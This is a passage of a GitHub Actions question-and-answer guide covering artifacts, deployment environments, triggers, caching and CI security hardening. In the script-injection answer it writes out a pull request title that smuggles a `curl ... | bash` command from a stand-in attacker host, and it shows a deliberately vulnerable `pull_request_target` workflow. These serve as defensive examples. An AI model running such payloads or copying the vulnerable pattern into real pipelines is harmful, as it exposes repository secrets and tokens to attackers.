The REST API has endpoints under `/repos/{owner}/{repo}/actions/`. The GitHub CLI wraps most of them.

```bash
# list failed runs of ci.yml on main
gh run list --workflow ci.yml --branch main --status failure --limit 20

# same with the raw API
gh api "repos/my-org/my-repo/actions/workflows/ci.yml/runs?branch=main&status=failure"

# cancel and re-run
gh api -X POST repos/my-org/my-repo/actions/runs/123456/cancel
gh api -X POST repos/my-org/my-repo/actions/runs/123456/rerun-failed-jobs
```

From inside a workflow, `GITHUB_TOKEN` needs `actions: write` to cancel or re-run runs.

## 264: How do you download an artifact from a different workflow run?

`actions/download-artifact` can download from another run if you give it the run ID and a token.

```yaml
- uses: actions/download-artifact@v7
  with:
    name: dist
    run-id: ${{ github.event.workflow_run.id }}
    github-token: ${{ github.token }}
    path: dist/
```

The job needs `actions: read`. This is common in `workflow_run` workflows that deploy what the CI run built. You can also use `gh run download <run-id> -n dist`.

## 265: What changed with artifacts in upload-artifact v4 and later?

- Artifacts are immutable. You can't upload to the same artifact name twice in a run (unless you set `overwrite: true`, which replaces it).
- Matrix jobs can't all upload to one shared name anymore, so each job needs a unique name, and you merge them later.
- Uploads and downloads are much faster, and the artifact is available (with an ID and URL) right after the upload step.
- A job can upload up to 500 artifacts.
- Hidden files are excluded by default.
- Artifacts made with v4 or later can't be downloaded with v3 or older, and the other way around.

v3 and older were shut down on GitHub.com, so any workflow still using them fails.

## 266: How do you combine artifacts from matrix jobs?

Give each matrix job a unique artifact name, then download them with a pattern and `merge-multiple`.

```yaml
# in each matrix job
- uses: actions/upload-artifact@v6
  with:
    name: coverage-${{ matrix.shard }}
    path: coverage/

# in the final job
- uses: actions/download-artifact@v7
  with:
    pattern: coverage-*
    merge-multiple: true
    path: all-coverage/
```

There's also `actions/upload-artifact/merge`, which merges several artifacts into a new one without downloading them in a job first.

## 267: How do you control artifact retention and compression?

```yaml
- uses: actions/upload-artifact@v6
  with:
    name: release-binaries
    path: build/*.tar.gz
    retention-days: 30
    compression-level: 0
    if-no-files-found: error
```

- `retention-days`: how long to keep it (within the repository's limit).
- `compression-level`: 0 (none) to 9 (best). Use 0 for files that are already compressed, like `.zip`, `.tar.gz` or images, since compressing them again only wastes time.
- `if-no-files-found`: `warn` (default), `error` or `ignore`. Use `error` when a missing file means the build is broken.

## 268: How do you install private npm packages from GitHub Packages?

Point npm at the GitHub registry for your scope and use `GITHUB_TOKEN` with `packages: read`.

```yaml
permissions:
  contents: read
  packages: read

steps:
  - uses: actions/checkout@v6
  - uses: actions/setup-node@v6
    with:
      node-version: 24
      registry-url: https://npm.pkg.github.com
      scope: "@my-org"
  - run: npm ci
    env:
      NODE_AUTH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
```

`setup-node` writes an `.npmrc` that reads the token from `NODE_AUTH_TOKEN`. For packages in other repositories, the package must grant access to this repository in its settings.

## 269: How do you authenticate to a private npm registry in CI?

Keep an `.npmrc` in the repository that reads the token from an environment variable, and pass the secret only to the install step.

```
# .npmrc
@acme:registry=https://npm.acme.internal/
//npm.acme.internal/:_authToken=${NPM_TOKEN}
```

```yaml
- run: npm ci
  env:
    NPM_TOKEN: ${{ secrets.ACME_NPM_TOKEN }}
```

Never commit the token itself. Passing it only to the install step means test scripts and build tools in later steps don't see it.

## 270: How do you handle different settings for dev, staging and production?

Use GitHub environments for each target and put the values that differ on the environment as variables and secrets. The workflow stays the same and reads `vars.X` and `secrets.Y`.

```yaml
jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: ${{ inputs.environment }}
    steps:
      - run: ./deploy.sh
        env:
          API_URL: ${{ vars.API_URL }}
          DB_PASSWORD: ${{ secrets.DB_PASSWORD }}
```

Keep app settings that aren't secret in the code repository too (for example `config/staging.json`), so they go through code review and are versioned with the code.

## 271: How do you chain a staging deploy and a production deploy with approval?

Use two jobs with `needs`, and put required reviewers on the `production` environment.

```yaml
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v6
      - run: npm ci && npm run build
      - uses: actions/upload-artifact@v6
        with:
          name: dist
          path: dist/

  staging:
    needs: build
    runs-on: ubuntu-latest
    environment: staging
    steps:
      - uses: actions/download-artifact@v7
        with: { name: dist, path: dist/ }
      - run: ./deploy.sh staging

  production:
    needs: staging
    runs-on: ubuntu-latest
    environment: production
    steps:
      - uses: actions/download-artifact@v7
        with: { name: dist, path: dist/ }
      - run: ./deploy.sh production
```

The run deploys to staging, then waits for approval before production. Both deploy the same `dist` artifact.

## 272: How do you use `needs.<job>.result` in conditions?

`needs.<job>.result` is `success`, `failure`, `cancelled` or `skipped`. You can use it to react to how earlier jobs ended. You need a status function like `always()` or `!cancelled()`, otherwise the job is skipped when a needed job fails.

```yaml
jobs:
  report:
    needs: [unit, e2e]
    if: ${{ !cancelled() }}
    runs-on: ubuntu-latest
    steps:
      - run: |
          echo "unit: ${{ needs.unit.result }}"
          echo "e2e: ${{ needs.e2e.result }}"
      - if: needs.e2e.result == 'failure'
        run: echo "E2E failed, creating a ticket"
```

## 273: How do you make one required check that covers all jobs?

Add a final job that depends on all other jobs, always runs, and fails if any of them failed or were cancelled. Then make only this job a required check.

```yaml
jobs:
  ci-ok:
    if: always()
    needs: [lint, test, build, e2e]
    runs-on: ubuntu-latest
    steps:
      - run: exit 1
        if: >-
          contains(needs.*.result, 'failure') ||
          contains(needs.*.result, 'cancelled')
```

Now you can add, remove or rename jobs and matrix entries without updating branch protection. Skipped jobs (from path filters) still count as fine.

## 274: How do you trigger a workflow with a comment like /deploy?

Use the `issue_comment` event. It fires for comments on issues and pull requests, so check that it's a pull request and that the comment starts with the command.

```yaml
on:
  issue_comment:
    types: [created]

jobs:
  deploy:
    if: >-
      github.event.issue.pull_request &&
      startsWith(github.event.comment.body, '/deploy')
    runs-on: ubuntu-latest
    steps:
      - run: echo "Deploying PR #${{ github.event.issue.number }}"
```

`issue_comment` runs from the default branch, not the pull request branch. If you check out the pull request's code here, you're running untrusted code with secrets, so check permissions first (next question).

## 275: How do you make sure only maintainers can run comment commands?

Check `author_association` on the comment, or check the user's permission through the API.

```yaml
jobs:
  deploy:
    if: >-
      github.event.issue.pull_request &&
      startsWith(github.event.comment.body, '/deploy') &&
      contains(fromJSON('["OWNER", "MEMBER", "COLLABORATOR"]'), github.event.comment.author_association)
    runs-on: ubuntu-latest
```

A safer option is to call `GET /repos/{owner}/{repo}/collaborators/{username}/permission` and require `write` or `admin`. Also, when you check out the pull request after the comment, use the exact head SHA from that moment, so someone can't push new code between the approval comment and the checkout.

## 276: What is the difference between the release event types?

- `published`: a release or pre-release was published (made visible). The most common one to react to.
- `released`: a full release was published, or a pre-release was changed to a full release. Pre-releases don't trigger it.
- `prereleased`: a pre-release was published.
- `created`: a release was created, including drafts.
- `edited`, `deleted`, `unpublished`: as the names say.

Draft releases don't trigger `published`. If you publish packages, react to `published` (or `released` if pre-releases should be skipped), not `created`.

## 277: What glob patterns can you use in branch, tag and path filters?

- `*` matches any characters except `/`.
- `**` matches any characters including `/`.
- `?` matches zero or one of the previous character.
- `+` matches one or more of the previous character.
- `[]` matches one character from a set or range, like `[0-9]`.
- `!` at the start negates a pattern.

```yaml
on:
  push:
    branches:
      - "release/**"
      - "!release/**-rc"
    tags:
      - "v[0-9]+.[0-9]+.[0-9]+"
    paths:
      - "src/**/*.ts"
```

Patterns that start with `*`, `[` or `!` must be quoted in YAML. Patterns are checked in order, so a later pattern can override an earlier one.

## 278: How do you read data from the event payload?

Everything the webhook sends is under `github.event`. Some useful fields:

```yaml
- run: |
    echo "PR number: ${{ github.event.pull_request.number }}"
    echo "PR base: ${{ github.event.pull_request.base.ref }}"
    echo "PR is draft: ${{ github.event.pull_request.draft }}"
    echo "Pushed commits: ${{ toJSON(github.event.commits.*.id) }}"
    echo "Release tag: ${{ github.event.release.tag_name }}"
```

Fields that come from users (titles, bodies, branch names, commit messages) should go into `env` and be used as shell variables, not placed directly in the script.

## 279: How do you use hashFiles with several patterns?

Pass several patterns as separate arguments. You can also exclude files with `!`.

```yaml
key: build-${{ runner.os }}-${{ hashFiles('**/package-lock.json', 'tsconfig*.json', '!**/node_modules/**') }}
```

`hashFiles` returns an empty string when nothing matches, which can make different jobs share the same key by accident. Also, it only looks inside `GITHUB_WORKSPACE`, so files outside the workspace can't be hashed. If the matched files are big or many, hashing can take a few seconds.

## 280: When is ${{ env.X }} different from $X in a run step?

`${{ env.X }}` is replaced by the runner before the shell starts. `$X` is read by the shell while the script runs.

This matters with `GITHUB_ENV`, which only affects later steps:

```yaml
- run: |
    echo "MODE=fast" >> "$GITHUB_ENV"
    echo "now: $MODE"                # empty
    echo "expr: ${{ env.MODE }}"     # empty
- run: |
    echo "now: $MODE"                # fast
    echo "expr: ${{ env.MODE }}"     # fast
```

In general, prefer `$X` inside scripts. It's read at run time and it's not open to the injection problems that `${{ }}` has with untrusted values.

## 281: How do you run a job only if an earlier job produced a certain output?

Expose the value as a job output and check it in the next job's `if`.

```yaml
jobs:
  check:
    runs-on: ubuntu-latest
    outputs:
      migrations: ${{ steps.diff.outputs.migrations }}
    steps:
      - uses: actions/checkout@v6
        with:
          fetch-depth: 2
      - id: diff
        run: |
          if git diff --name-only HEAD~1 HEAD | grep -q '^migrations/'; then
            echo "migrations=true" >> "$GITHUB_OUTPUT"
          else
            echo "migrations=false" >> "$GITHUB_OUTPUT"
          fi

  migrate:
    needs: check
    if: needs.check.outputs.migrations == 'true'
    runs-on: ubuntu-latest
    steps:
      - run: echo "Running migrations"
```

Outputs are strings, so compare with `'true'`, not `true`.

## 282: How do you cancel a run from inside the workflow?

Call the API to cancel the current run. The job needs `actions: write`.

```yaml
- name: Stop if nothing to do
  if: steps.check.outputs.skip == 'true'
  run: gh run cancel "${{ github.run_id }}"
  env:
    GH_TOKEN: ${{ github.token }}
    GH_REPO: ${{ github.repository }}
```

Often it's cleaner to just skip the remaining jobs with `if` conditions, which leaves the run green instead of "cancelled". Cancelling makes sense when the run should clearly not count, for example when a newer commit already exists.

## 283: How do you install system packages on the runner?

Use the OS package manager. Hosted runners allow passwordless `sudo`.

```yaml
- if: runner.os == 'Linux'
  run: |
    sudo apt-get update
    sudo apt-get install -y --no-install-recommends imagemagick
- if: runner.os == 'macOS'
  run: brew install imagemagick
- if: runner.os == 'Windows'
  run: choco install imagemagick -y
```

Installing packages on every run adds time. If you need many tools, check if they're already on the image, or use a job container that has them preinstalled.

## 284: How do you check which runner image a job used?

Open the "Set up job" step in the log. It shows the runner name, the image name and version, and a link to the list of included software for that exact image version.

This is the first place to look when a build that used to pass starts failing without any code change. If the image version changed between the last good run and the failing one, compare the software lists to see what was updated.

## 285: How do you write a job that only runs on the default branch, whatever its name is?

Compare `github.ref_name` with the default branch from the event's repository data.

```yaml
jobs:
  publish:
    if: github.event_name == 'push' && github.ref_name == github.event.repository.default_branch
    runs-on: ubuntu-latest
    steps:
      - run: echo "On the default branch"
```

This is useful in reusable workflows and templates shared by repositories that use `main`, `master` or other branch names.

## 286: How do you automate issue triage with Actions?

Use the `issues` event and the GitHub CLI or API to label, assign or comment.

```yaml
on:
  issues:
    types: [opened]

permissions:
  issues: write

jobs:
  triage:
    runs-on: ubuntu-latest
    steps:
      - if: contains(github.event.issue.title, 'bug')
        run: gh issue edit "$NUMBER" --add-label bug --add-label needs-triage
        env:
          GH_TOKEN: ${{ github.token }}
          GH_REPO: ${{ github.repository }}
          NUMBER: ${{ github.event.issue.number }}
```

Issue forms (YAML issue templates) make this easier, because they give you structured fields you can rely on instead of guessing from free text.

## 287: How do you close stale issues and pull requests?

Use `actions/stale` on a schedule.

```yaml
on:
  schedule:
    - cron: "30 1 * * *"

permissions:
  issues: write
  pull-requests: write

jobs:
  stale:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/stale@v9
        with:
          days-before-stale: 60
          days-before-close: 14
          stale-issue-label: stale
          exempt-issue-labels: pinned,security
          stale-issue-message: This issue has had no activity for 60 days and will be closed in 14 days.
```

Be careful with the settings. Closing real bug reports automatically annoys contributors, so many projects exempt certain labels or only mark items as stale without closing them.

## 288: How do you label pull requests automatically by changed files?

Use `actions/labeler` with a config file that maps labels to file patterns.

```yaml
# .github/labeler.yml
frontend:
  - changed-files:
      - any-glob-to-any-file: "apps/web/**"
backend:
  - changed-files:
      - any-glob-to-any-file: "apps/api/**"
```

```yaml
# .github/workflows/labeler.yml
on: pull_request_target

permissions:
  contents: read
  pull-requests: write

jobs:
  label:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/labeler@v5
```

It uses `pull_request_target` so it can label pull requests from forks too. That's safe here because it doesn't check out or run the pull request's code.

## 289: How do you run CodeQL code scanning in Actions?

The easiest way is "default setup" in the repository's code security settings, which needs no workflow file. For more control, use "advanced setup" with a workflow:

```yaml
on:
  push:
    branches: [main]
  pull_request:
  schedule:
    - cron: "20 4 * * 1"

permissions:
  contents: read
  security-events: write

jobs:
  analyze:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        language: [javascript-typescript, actions]
    steps:
      - uses: actions/checkout@v6
      - uses: github/codeql-action/init@v4
        with:
          languages: ${{ matrix.language }}
      - uses: github/codeql-action/analyze@v4
```

The `actions` language scans your workflow files themselves for problems like script injection and unsafe triggers.

## 290: How do you block pull requests that add vulnerable dependencies?

Use `actions/dependency-review-action`. It compares the dependencies in the base and head of the pull request and fails if new ones have known vulnerabilities or disallowed licenses.

```yaml
on: pull_request

permissions:
  contents: read
  pull-requests: write

jobs:
  review:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v6
      - uses: actions/dependency-review-action@v4
        with:
          fail-on-severity: high
          deny-licenses: GPL-3.0, AGPL-3.0
          comment-summary-in-pr: on-failure
```

It needs the dependency graph to be enabled. It's cheap and quick, so it's a good required check.

## 291: How do you upload results from other security scanners to GitHub?

If the scanner can output SARIF (most do: Trivy, Semgrep, ESLint with a formatter, and others), upload the file with the CodeQL upload action. The results then show up in the Security tab and as annotations on pull requests.

```yaml
permissions:
  contents: read
  security-events: write

steps:
  - uses: actions/checkout@v6
  - run: trivy fs --format sarif --output trivy.sarif .
  - uses: github/codeql-action/upload-sarif@v4
    if: ${{ !cancelled() }}
    with:
      sarif_file: trivy.sarif
      category: trivy
```

`category` keeps results from different tools apart.

## 292: How do you give an expression a default when a value may be missing?

Use `||`. If the left side is empty, `null`, `false` or `0`, the right side is used.

```yaml
on:
  push:
  workflow_dispatch:
    inputs:
      environment:
        type: choice
        options: [staging, production]

jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: ${{ inputs.environment || 'staging' }}
    steps:
      - run: echo "Deploying to ${{ inputs.environment || 'staging' }}"
```

On `push` there are no inputs, so the value falls back to `staging`. Watch out with booleans and numbers: `inputs.count || 5` gives 5 when someone actually picks 0.

## 293: How do you handle several triggers differently in one workflow?

Check `github.event_name` in `if` conditions, and use fallbacks for values that only exist for some events.

```yaml
on:
  push:
    branches: [main]
  pull_request:
  workflow_dispatch:

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v6
      - run: npm ci && npm test

  deploy:
    needs: test
    if: github.event_name == 'push' || github.event_name == 'workflow_dispatch'
    runs-on: ubuntu-latest
    steps:
      - run: echo "Deploying ${{ github.sha }}"
```

If the differences grow large, splitting into separate workflows is usually easier to read than many conditions.

## 294: How do you run database migrations as part of integration tests?

Start the database as a service container, run the migrations against it, then run the tests.

```yaml
services:
  postgres:
    image: postgres:17
    env:
      POSTGRES_PASSWORD: test
    ports: ["5432:5432"]
    options: --health-cmd pg_isready --health-interval 5s --health-retries 10

steps:
  - uses: actions/checkout@v6
  - uses: actions/setup-node@v6
    with:
      node-version: 24
      cache: npm
  - run: npm ci
  - run: npx prisma migrate deploy
    env:
      DATABASE_URL: postgres://postgres:test@localhost:5432/postgres
  - run: npm run test:integration
    env:
      DATABASE_URL: postgres://postgres:test@localhost:5432/postgres
```

This also tests that the migrations themselves work on an empty database, which catches broken migration files before they reach production.

## 295: How do you cache build tool output, like the Next.js cache?

Cache the tool's cache folder with a key that changes when inputs change, and a restore key so you get a partial hit.

```yaml
- uses: actions/cache@v5
  with:
    path: |
      ~/.npm
      ${{ github.workspace }}/.next/cache
    key: nextjs-${{ runner.os }}-${{ hashFiles('**/package-lock.json') }}-${{ hashFiles('**/*.ts', '**/*.tsx') }}
    restore-keys: |
      nextjs-${{ runner.os }}-${{ hashFiles('**/package-lock.json') }}-
```

The same idea works for other tools that keep a cache folder: Turborepo (`.turbo`), Nx, Gradle, Jest, ESLint (`.eslintcache`) and TypeScript build info files.

## 296: How do you start your app in the background before E2E tests?

Start it with `&`, then wait until it responds before running the tests.

```yaml
- run: npm run build
- run: npm run start &
- run: npx wait-on http://localhost:3000 --timeout 60000
- run: npx playwright test
```

Background processes started in a step keep running in later steps of the same job and are stopped when the job ends. Many test runners can also start the server for you (Playwright's `webServer` option), which handles waiting and stopping.

## 297: How do you stop a workflow from running in forks?

Check the repository name in a job-level `if`.

```yaml
jobs:
  publish:
    if: github.repository == 'my-org/my-project'
    runs-on: ubuntu-latest
    steps:
      - run: npm publish
```

When someone forks your repository and enables Actions, scheduled jobs, publishing and deploy workflows would otherwise run in their fork and fail (or worse, try to publish). This check makes them skip cleanly.

## 298: How do you avoid duplicate runs on push and pull_request?

If you trigger on both without filters, a push to a branch with an open pull request starts two runs for the same code. Common fixes:

```yaml
on:
  push:
    branches: [main]
  pull_request:
```

This runs `push` only on `main`, and `pull_request` for all pull requests. Feature branches without a pull request don't run CI at all, which most teams are fine with. Another option is a concurrency group based on the commit SHA with `cancel-in-progress`.

## 299: How do you write a job summary from JavaScript?

Use `core.summary` from `@actions/core`, which is also available in `actions/github-script`.

```yaml
- uses: actions/github-script@v8
  with:
    script: |
      await core.summary
        .addHeading('Deploy result')
        .addTable([
          [{ data: 'Service', header: true }, { data: 'Status', header: true }],
          ['api', 'ok'],
          ['web', 'ok'],
        ])
        .addLink('Open app', 'https://staging.example.com')
        .write();
```

`write()` appends to the summary file. Use `write({ overwrite: true })` to replace what was written before in that step.

## 300: How do you test a custom action?

- **Unit tests**: for JavaScript actions, test the logic with Jest or Vitest and mock `@actions/core` and the GitHub API.
- **Integration tests**: add a workflow in the action's repository that uses the action with `uses: ./` and checks its outputs.

```yaml
on: [push, pull_request]

jobs:
  test-action:
    strategy:
      matrix:
        os: [ubuntu-latest, windows-latest, macos-latest]
    runs-on: ${{ matrix.os }}
    steps:
      - uses: actions/checkout@v6
      - id: greet
        uses: ./
        with:
          who: tester
      - run: test "${{ steps.greet.outputs.greeting }}" = "Hello, tester!"
        shell: bash
```

Also add a check that the committed `dist/` folder matches a fresh build, so nobody forgets to rebuild before releasing.

# Advanced Questions (301-450)

## 301: How does GitHub Actions run a job under the hood?

1. An event happens, and GitHub reads the matching workflow files at the commit for that event.
2. GitHub evaluates the triggers and filters, creates a workflow run, and plans the jobs based on `needs` and the matrix.
3. Each job that is ready is put in a queue with its `runs-on` requirements.
4. A runner with matching labels (and access through its runner group) picks up the job. The runner keeps a long-polling HTTPS connection to GitHub's service, so it pulls work instead of GitHub pushing to it.
5. The runner gets a job message with the steps, contexts, secrets it needs and a fresh `GITHUB_TOKEN`.
6. It downloads the actions, runs the steps, streams the logs back and reports the result.

Because the runner only makes outbound connections, self-hosted runners can sit behind a firewall with no open inbound ports.

## 302: What is the lifecycle of a job on a runner?

1. **Set up job**: prepare the workspace, download the actions used in the job, log runner and image info and token permissions.
2. **Initialize containers** if the job uses `container` or `services`: pull images, create a network, start them and wait for health checks.
3. **Pre steps**: any `pre` scripts of actions in the job, in order.
4. **Main steps**: your steps, in order.
5. **Post steps**: `post` scripts of actions, in **reverse** order (for example, `actions/cache` saves here and `actions/checkout` removes credentials here).
6. **Stop containers** and **complete job**: clean up processes, the workspace (on ephemeral runners the whole VM goes away) and report the result.

## 303: What are pre and post steps in actions?

JavaScript and Docker actions can define code that runs at the start (`pre`) and at the end (`post`) of the job, besides their main code.

```yaml
runs:
  using: node24
  pre: dist/setup.js
  main: dist/index.js
  post: dist/cleanup.js
  post-if: always()
```

`post` is used for cleanup or for work that must happen after your steps, like saving a cache or removing a credential. `post-if` (and `pre-if`) control when they run; the default for `post` is `always()`. Composite actions don't support `pre` and `post`.

## 304: How does the runner download and store actions?

In the "Set up job" step, the runner resolves each `uses` ref (tag, branch or SHA) to a commit and downloads the action repository as an archive. On GitHub-hosted runners this happens fresh for every job. Self-hosted runners keep a local copy in their `_work/_actions` folder.

Docker actions with a `Dockerfile` are built during setup; actions pointing to `docker://` images are pulled.

Since a tag is resolved at the start of every job, a moved tag changes what code runs, even in a re-run of an old workflow. That's the main argument for pinning third-party actions to full commit SHAs.

## 305: When and where are expressions evaluated?

It depends on the key:

- Workflow-level and job-level keys like `on`, `runs-on`, `if` on jobs, `strategy`, `concurrency` and `environment` are evaluated by GitHub's service before the job is sent to a runner. That's why `env` and `secrets` aren't available in a job-level `if`.
- Step-level keys (`if`, `with`, `env`, `run`) are evaluated by the runner, just before each step runs, so they can use `steps` and `env` values from earlier steps.

For `run`, the runner replaces `${{ }}` in the script text first, then writes the result to a temporary file and runs it with the shell. The shell never sees the expression, only the final text.

## 306: What is script injection in GitHub Actions?

Because `${{ }}` in a `run` block is replaced as plain text before the shell runs, any value that contains shell syntax becomes code.

```yaml
# Vulnerable
- run: echo "Title: ${{ github.event.pull_request.title }}"
```

If someone opens a pull request titled `"; curl https://evil.example/x.sh | bash; echo "`, the step runs their command, with access to the job's environment, the token and any secrets in that job.

Dangerous inputs include pull request and issue titles and bodies, comments, branch names, commit messages, author names, review text and some fields in `workflow_run` payloads. Many real projects have been compromised this way.

## 307: How do you prevent script injection?

Pass untrusted values through `env` and use them as shell variables, quoted:

```yaml
- run: echo "Title: $PR_TITLE"
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
```

Now the shell receives the title as data, not as code.

Other measures:

- Use `actions/github-script` and read `context.payload` in JavaScript instead of building shell commands.
- Validate input that should have a format (like a version number) with a strict regex before using it.
- Run `actionlint`, `zizmor` or CodeQL for the `actions` language, which flag `${{ }}` with untrusted data in `run` blocks.
- Keep `GITHUB_TOKEN` permissions small, so an injection can do less damage.

## 308: What is a "pwn request"?

It's the attack where a workflow triggered by `pull_request_target` (or `workflow_run` or `issue_comment`) checks out and runs code from a pull request. That event runs with secrets and a write token, so the attacker's code gets them too.

```yaml
# Dangerous
on: pull_request_target
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v6
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: npm ci && npm test # runs the attacker's package.json scripts
```

The fix: run untrusted code only in `pull_request` workflows (no secrets, read-only token). If a privileged follow-up is needed, use a separate `workflow_run` workflow that only handles data, never runs pull request code, and validates whatever it reads from artifacts.

## 309: How do you safely use artifacts from an untrusted workflow in workflow_run?

The privileged `workflow_run` workflow must treat the artifact as hostile input:

- Download it to a temporary folder outside the workspace, not on top of your checked-out code.
- Never execute files from it, and never `source` or `eval` its content.
- Parse only the format you expect (like a JSON file with a pull request number and coverage percent) and validate every field.
- Don't trust a pull request number from the artifact without checking it against `github.event.workflow_run.pull_requests` or the API.
- Keep the permissions of the privileged workflow as small as possible.

```yaml
- run: |
    pr=$(jq -r '.pr' "$RUNNER_TEMP/result/result.json")
    [[ "$pr" =~ ^[0-9]+$ ]] || { echo "Bad PR number"; exit 1; }
    echo "PR=$pr" >> "$GITHUB_ENV"
```

## 310: What is cache poisoning in GitHub Actions?

Cache poisoning is when an attacker writes malicious content into a cache that a trusted workflow later restores. For example, a compromised dependency in a low-privilege job saves a modified `node_modules` or build tool into a cache key that the release workflow on `main` later uses.

Ways to reduce the risk:

- Caches from pull requests are scoped to that pull request and can't be read by `main`, so keep it that way and don't let untrusted code run on the default branch.
- Don't use caches in release and publish workflows. Build them from scratch.
- Don't run `pull_request_target` or other privileged workflows that restore or save caches with untrusted code.
- Use lock files and integrity checks so restored dependencies are verified on install.

## 311: Why should you pin actions to a full commit SHA?

Tags and branches can be moved. If the maintainer's account is compromised, or they make a mistake, `@v3` can suddenly point to different code, and every workflow using it runs that code with its secrets on the next run.

A full 40-character SHA can't be changed to point to other code, so you run exactly what you reviewed.

```yaml
- uses: some-org/some-action@3f1a5c9e2b7d4e8f0a6c1b2d3e4f5a6b7c8d9e0f # v2.4.1
```

Keep the version comment so humans and Dependabot know what it is. Dependabot and Renovate update SHAs and comments together. Pinning matters most for third-party actions; for GitHub's own `actions/*` actions some teams accept major tags, but pinning everything is the stricter rule.

## 312: What happened in the tj-actions/changed-files compromise, and what did it teach?

In March 2025, the popular action `tj-actions/changed-files` was compromised. The attacker moved existing version tags to a malicious commit that printed the runner's memory to the logs, which exposed secrets. Public repositories were hit hardest, because their logs are public. It was traced back to an earlier compromise of another action (`reviewdog`) used in its own CI.

Lessons:

- Version tags are not safe. Pin to commit SHAs.
- A compromised action has the same access as your workflow, so least-privilege tokens and few secrets per job matter.
- Your dependencies' CI security is part of your supply chain.
- Have a plan: find all usages fast (code search), rotate exposed secrets and review logs.

## 313: How do you enforce allowed actions and SHA pinning in an organization?

In the organization or enterprise Actions settings you can:

- Allow only actions from GitHub, verified creators, or a specific allow list (`my-org/*`, `docker/build-push-action@*`).
- Block specific actions or versions with a `!` entry in the list.
- Require actions to be pinned to a full commit SHA. Workflows that use a tag or branch for an action then fail.

Combine this with a CODEOWNERS rule on `.github/workflows/` and a linter like `zizmor` or `actionlint` in CI, so problems are caught in review, not only at run time.

## 314: What are immutable releases and how do they help with actions?

When immutable releases are turned on for a repository, a published release and its tag can't be changed or deleted, and its assets can't be replaced. GitHub also creates a release attestation you can verify.

For actions, this means that if you use `@v2.4.1` from a repository with immutable releases, that tag will always point to the same commit. It doesn't protect moving major tags like `v2`, which are updated by design, so SHA pinning or exact immutable versions are still the safe choice.

## 315: What is planned for dependency locking in GitHub Actions?

GitHub's 2026 security roadmap includes a lock mechanism for workflow dependencies. The idea is a `dependencies:` section in the workflow that records the exact commit SHAs of all actions used, including actions called by other actions (transitive dependencies), similar to a lock file in npm.

Today, SHA pinning only covers your direct `uses` lines. If a pinned composite action internally uses `other/action@v1`, that inner tag can still move. Locking would fix that gap. Since it's a roadmap item, check the GitHub changelog for its current status before relying on it.

## 316: How do you review a third-party action before using it?

- Read `action.yml` and the code that actually runs (for JavaScript actions, the committed `dist/` bundle, not just `src/`).
- Check who maintains it, how active it is, and whether the repository has branch protection, signed or immutable releases and security policies.
- See what inputs it needs. An action that asks for a token with broad rights deserves more scrutiny.
- Look for network calls, downloads of extra scripts, and use of `curl | bash`.
- Prefer actions from GitHub or the tool's own vendor, or write the few lines of shell yourself.

After approving, pin to a SHA and add it to the organization's allow list.

## 317: How do you limit the damage a compromised step can do?

- Set `permissions` to the minimum, per job. Default to `contents: read`.
- Give each job only the secrets it needs, via step-level `env`, not workflow-level.
- Put sensitive secrets in environments with protection rules.
- Use OIDC with narrow trust policies instead of long-lived cloud keys.
- Set `persist-credentials: false` on checkout when the job doesn't need to push.
- Separate untrusted work (tests, installs from npm) from privileged work (publish, deploy) into different jobs.
- Use ephemeral runners so nothing persists between jobs.
- Restrict network egress where possible.

## 318: What does persist-credentials do in actions/checkout, and why turn it off?

By default `actions/checkout` keeps the token it used available to git for the rest of the job, so later steps can run `git push` or `git fetch` without extra setup. In v6 and later, the credentials are written to a separate file under `$RUNNER_TEMP` and linked from the git config instead of being stored in `.git/config` directly.

Any step in the job, including third-party actions and npm install scripts, can still read that token. If the job doesn't need to talk to git after checkout, turn it off:

```yaml
- uses: actions/checkout@v6
  with:
    persist-credentials: false
```

This is especially important when you upload the workspace as an artifact, because older setups could leak the token inside `.git/config`.

## 319: How does secret masking work, and where does it fail?

The runner knows the values of the secrets sent to the job and replaces them with `***` in log output. It also masks some common encodings of them, and values you register with `::add-mask::`.

It fails when:

- The secret is transformed (reversed, split, encoded in a way the runner doesn't know, or hex dumped).
- The secret is a structured value like JSON, where a field may be printed alone. Store each sensitive value as its own secret.
- The secret leaves through another channel: an artifact, a cache, a network request, or a file a later step uploads.
- The value was generated at run time and never masked.

Masking stops accidental leaks in logs, not intentional theft.

## 320: How can a compromised dependency steal secrets during CI, and how do you defend?

An npm package can run code during install (`preinstall`/`postinstall` scripts) or during tests. That code can read environment variables, files like `~/.npmrc` or git credentials, and the runner's process memory, then send them out over the network.

Defenses:

- Don't expose secrets to install and test steps. Pass them only to the steps that need them.
- Use `npm ci --ignore-scripts` where possible, and allow scripts only for packages that really need them.
- Use lock files and review dependency updates. Some teams delay new versions by a few days to let the community spot malicious releases.
- Limit outbound network traffic from runners.
- Use OIDC instead of static keys, so stolen credentials expire quickly.

## 321: How can you restrict network access from runners?

GitHub-hosted runners have open outbound internet access by default. Options to tighten it:

- **Self-hosted or larger runners in your own network** (for example with Azure private networking) behind a firewall or proxy that only allows known domains.
- **Third-party tools** like `step-security/harden-runner`, which monitor or block outbound connections on hosted runners and show which domains each job contacts.
- **GitHub's native egress firewall** for hosted runners, which is on the 2026 security roadmap. Check the changelog for its status.

Start in audit mode to learn which domains your builds need (registries, CDNs, APIs), then switch to blocking.

## 322: Why are self-hosted runners risky for public repositories?

Anyone can open a pull request on a public repository. If workflows for pull requests run on your self-hosted runner, a stranger can run any code on your machine.

On a persistent runner, that code can install a backdoor that stays for later jobs, read credentials left on disk, attack your internal network, or wait for a privileged job (like a deploy on `main`) and steal its secrets.

GitHub's advice is not to use self-hosted runners with public repositories. If you must, use ephemeral, isolated runners with no network access to internal systems, and require approval for all outside contributors.

## 323: What are ephemeral and just-in-time runners?

An **ephemeral runner** takes exactly one job and then unregisters itself. You start it with `--ephemeral`, and your tooling destroys the machine or container after the job and creates a new one.

